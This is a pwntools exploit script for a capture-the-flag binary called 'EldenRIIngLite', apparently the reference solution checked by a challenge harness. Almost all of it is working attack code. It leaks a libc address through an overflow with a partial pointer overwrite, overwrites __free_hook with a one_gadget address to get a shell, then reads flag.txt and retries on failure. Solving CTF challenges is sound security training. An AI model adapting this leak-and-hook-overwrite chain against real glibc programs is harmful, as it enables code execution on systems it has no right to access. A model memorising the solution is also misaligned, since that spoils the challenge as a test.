#!/usr/bin/env python3
from pwn import *
import os

context.update(arch='amd64')
context.log_level = 'warning'
exe = '.build/EldenRIIngLite' if os.path.exists('.build/EldenRIIngLite') else './EldenRIIngLite'
# Published alongside the binary; offsets (free_hook 0x1eee48, one_gadget 0xe3b01)
# match glibc 2.31-0ubuntu9.16 shipped in the Ubuntu 20.04 challenge container.
with context.quiet:
    libc = ELF('publish/EldenRIIngLite-libc.so' if os.path.exists('publish/EldenRIIngLite-libc.so') else './EldenRIIngLite-libc.so')

# Env-driven target so `pwnmake check` can point us at the started container
# (HOST/PORT default to a local instance for manual runs).
HOST = os.environ.get('HOST') or (args.HOST or 'localhost')
PORT = int(os.environ.get('PORT') or args.PORT or 22003)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        if args.GDB:
            return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
        return process([exe] + argv, *a, **kw)
    return remote(HOST, PORT)

def beat_first_boss(io: process) -> None:
    io.sendlineafter(b'name? : ', b'RII')
    io.sendlineafter(b'departing?\n: ', b'RII')
    io.sendlineafter(b'strike\n: ', b'2')
    io.sendlineafter(b'Warden\n: ', b'3')
    io.sendlineafter(b'n): ', b'n') # Don't leave message yet

def beat_second_boss(io: process) -> tuple:
    io.sendlineafter(b'side\n: ', b'1')
    io.sendlineafter(b'him?\n: ', cyclic(16) + b'\xb0\x5f\x40') # Leak libc
    io.sendlineafter(b'emote\n: ', b'3')
    io.recvuntil(b'dropped ')
    leak_libc = int(io.recvuntil(b' runes').split()[0].decode())
    libc.address = leak_libc - libc.symbols['puts']
    free_hook = libc.address + 0x1eee48
    magic_gadget = libc.address + 0xe3b01
    return free_hook, magic_gadget

def beat_third_boss(io: process) -> None:
    io.sendlineafter(b'Aethelwulf\n: ', b'2')
    io.sendlineafter(b'hit\n: ', b'2')
    io.sendlineafter(b' : ', b'y') # NG+

def exploit(io: process, free_hook: int, magic_gadget: int) -> None:
    io.sendlineafter(b'departing?\n: ', b'\x00' * 14 + b'\x02\x00' + b'\x00' * 0xa8 + p64(free_hook))
    io.sendlineafter(b'strike\n: ', b'2')
    io.sendlineafter(b'Warden\n: ', b'3')
    io.sendlineafter(b'n): ', b'y')
    io.sendlineafter(b'message: ', p64(magic_gadget)) # Perform exploit


gdbscript = '''
b *0x4015ba
continue
'''.format(**locals())


def attempt():
    '''Run the full chain once; return the flag string if we got a shell, else None.

    The libc leak + one_gadget are probabilistic, so retry the whole chain on
    failure (fresh ASLR per connection).'''
    with context.quiet:
        io = start()
    try:
        beat_first_boss(io)
        free_hook, magic_gadget = beat_second_boss(io)
        beat_third_boss(io)
        exploit(io, free_hook, magic_gadget)

        # Print the flag so `pwnmake check` can verify it (instead of a shell)
        io.sendline(b'cat flag.txt')
        data = io.recvrepeat(1.5)
        m = re.search(rb'sun\{[^}]*\}', data)
        return m.group(0).decode() if m else None
    finally:
        try:
            io.close()
        except Exception:
            pass


# Retry the probabilistic one_gadget until it lands (bounded by CHECK_TIMEOUT).
for i in range(40):
    try:
        flag = attempt()
    except (EOFError, BrokenPipeError, ValueError):
        flag = None
    if flag:
        print(flag)
        break
    log.info("attempt %d failed, retrying", i)
else:
    print("exploit failed")
